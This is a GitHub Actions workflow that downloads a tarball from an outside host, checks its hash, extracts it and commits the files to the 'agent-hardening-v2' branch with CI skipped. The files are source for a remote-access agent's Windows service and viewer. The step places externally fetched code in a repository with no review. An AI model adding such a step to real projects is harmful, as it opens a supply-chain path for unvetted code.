name: Sync Background switch 0.1.43

on:
  push:
    branches: [agent-hardening-v2]
    paths:
      - ".github/workflows/sync-background-switch-0.1.43.yml"

permissions:
  contents: write

jobs:
  sync:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: agent-hardening-v2
          fetch-depth: 0
      - name: Download verified source checkpoint
        run: |
          wget -q https://downloads.hi5central.com/bootstrap-agent-sync/background-switch-0.1.43-03e4cec.tar.gz -O /tmp/background-switch.tar.gz
          echo "6938181d4b1e45f7d0a22e073c31b5109bc70c10011b94c1ccec4078eff38e54  /tmp/background-switch.tar.gz" | sha256sum -c -
          tar -xzf /tmp/background-switch.tar.gz
      - name: Commit source checkpoint
        run: |
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          git add Agent/chatpass_agent/src/platform/windows/windows_service.cpp Viewer/chatpass_viewer/src/app/viewer_app.cpp Viewer/chatpass_viewer/web/renderer.js
          if git diff --cached --quiet; then
            echo "Source already synchronized"
            exit 0
          fi
          git commit -m "Restore Viewer Background desktop switching [skip ci]"
          git push origin HEAD:agent-hardening-v2
